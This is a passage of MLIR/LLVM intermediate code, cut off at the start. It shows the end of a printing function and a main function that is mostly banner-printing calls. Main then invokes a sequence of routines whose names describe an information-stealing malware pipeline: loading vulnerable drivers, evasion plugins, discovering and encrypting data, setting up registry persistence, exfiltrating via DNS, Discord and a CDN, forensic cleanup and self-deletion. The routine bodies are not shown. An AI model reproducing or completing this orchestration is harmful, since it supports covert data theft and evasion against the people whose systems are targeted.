    llvm.call @println(%57) : (!llvm.ptr) -> ()
    %58 = llvm.getelementptr %18[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%58) : (!llvm.ptr) -> ()
    %59 = llvm.getelementptr %19[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @println(%59) : (!llvm.ptr) -> ()
    %60 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%60) : (!llvm.ptr) -> ()
    %61 = llvm.getelementptr %20[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<56 x i8>
    llvm.call @println(%61) : (!llvm.ptr) -> ()
    %62 = llvm.getelementptr %21[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<51 x i8>
    llvm.call @println(%62) : (!llvm.ptr) -> ()
    %63 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<81 x i8>
    llvm.call @println(%63) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @main() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.181" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.197" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.198" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.199" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.200" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.201" : !llvm.ptr
    %9 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %10 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %11 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%11) : (!llvm.ptr) -> ()
    %12 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<81 x i8>
    llvm.call @println(%12) : (!llvm.ptr) -> ()
    %13 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
    llvm.call @println(%13) : (!llvm.ptr) -> ()
    %14 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<77 x i8>
    llvm.call @println(%14) : (!llvm.ptr) -> ()
    %15 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<53 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<81 x i8>
    llvm.call @println(%16) : (!llvm.ptr) -> ()
    %17 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%17) : (!llvm.ptr) -> ()
    llvm.call @initialize_systems() : () -> ()
    llvm.call @load_byovd_drivers() : () -> ()
    llvm.call @assess_threat_environment() : () -> ()
    llvm.call @select_and_activate_strategy() : () -> ()
    llvm.call @load_evasion_plugins() : () -> ()
    %18 = llvm.call @discover_data_sources() : () -> !llvm.ptr
    llvm.store %18, %9 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.call @spawn_sandbox_collector() : () -> ()
    %19 = llvm.load %9 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %20 = llvm.call @collect_and_encrypt_data(%19) : (!llvm.ptr) -> i32
    llvm.store %20, %10 {alignment = 4 : i64} : i32, !llvm.ptr
    %21 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    llvm.call @setup_persistence_and_registry() : () -> ()
    %22 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
    llvm.call @println(%22) : (!llvm.ptr) -> ()
    llvm.call @exfiltrate_via_dns() : () -> ()
    llvm.call @exfiltrate_via_discord() : () -> ()
    llvm.call @exfiltrate_via_cdn() : () -> ()
    %23 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    llvm.call @perform_forensic_cleanup() : () -> ()
    llvm.call @perform_self_deletion() : () -> ()
    llvm.call @export_audit_trail() : () -> ()
    llvm.call @print_summary() : () -> ()
    llvm.return
  }
}
